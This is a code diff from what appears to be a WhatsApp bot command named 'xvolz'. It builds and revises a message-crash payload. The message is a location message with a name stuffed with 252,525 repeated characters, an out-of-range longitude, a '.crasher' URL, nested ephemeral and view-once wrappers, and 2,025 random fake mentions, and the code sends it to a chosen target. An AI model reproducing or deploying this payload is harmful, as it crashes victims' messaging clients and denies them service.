@@ -79,57 +79,54 @@ case "xvolz": {
       pushName: "©RexzSuki"
     };
 
-    const locationMsg = proto.Message.LocationMessage.fromObject({
-      degreesLatitude: -9.09165299926,
-      degreesLongitude: 199.197369996311,
-      name: "㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞𝐫🕊️\n" + "ꦾ".repeat(252525),
-      address: "",
-      url: "https://㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞𝐫🕊️ " + "ꦃ".repeat(35) + ".crasher",
-      isLive: true,
-      accuracyInMeters: 252525,
-      jpegThumbnail: null,
-      contextInfo: {
-        forwardingScore: 252525,
-        isForwarded: true,
-        externalAdReply: {
-          mediaType: 2,
-          title: "",
-          body: "",
-          mediaUrl: "",
-          thumbnail: null
-        }
-      }
-    });
+function generateRandomLids(count = 2025) {
+  const lids = new Set();
+  while (lids.size < count) {
+    const randomNum = Math.floor(Math.random() * 1e15).toString().padStart(15, '0');
+    lids.add(randomNum + "@lid");
+  }
+  return Array.from(lids);
+}
 
-    const msgContent = {
-      ephemeralMessage: {
+function mentionJid() {
+  return generateRandomLids();
+}
+
+const locationMsg = proto.Message.LocationMessage.fromObject({
+  degreesLatitude: -9.09165299926,
+  degreesLongitude: 199.197369996311,
+  name: "㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️\n" + "ꦾ".repeat(252525),
+  address: "",
+  url: "https://㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️ " + "ꦃ".repeat(35) + ".crasher",
+  isLive: true,
+  accuracyInMeters: 252525,
+  jpegThumbnail: null,
+  contextInfo: {
+    forwardingScore: 252525,
+    isForwarded: true,
+    mentionedJid: mentionJid(),
+    externalAdReply: {
+      mediaType: 2,
+      title: "",
+      body: "",
+      mediaUrl: "",
+      thumbnail: null
+    }
+  }
+});
+
+const msgContent = {
+  ephemeralMessage: {
+    message: {
+      viewOnceMessageV2: {
         message: {
-          viewOnceMessageV2: {
-            message: {
-              ephemeralMessage: {
-                message: {
-                  locationMessage: locationMsg
-                },
-                ephemeralExpiration: 999999,
-                contextInfo: {
-                  forwardingScore: 10,
-                  isForwarded: true
-                }
-              }
-            },
-            contextInfo: {
-              forwardingScore: 15,
-              isForwarded: true
-            }
-          }
-        },
-        ephemeralExpiration: 999999,
-        contextInfo: {
-          forwardingScore: 20,
-          isForwarded: true
+          locationMessage: locationMsg
         }
       }
-    };
+    },
+    ephemeralExpiration: 252525
+  }
+};
 
     const msg = generateWAMessageFromContent(target, msgContent, {
       userJid: sock.user.id,
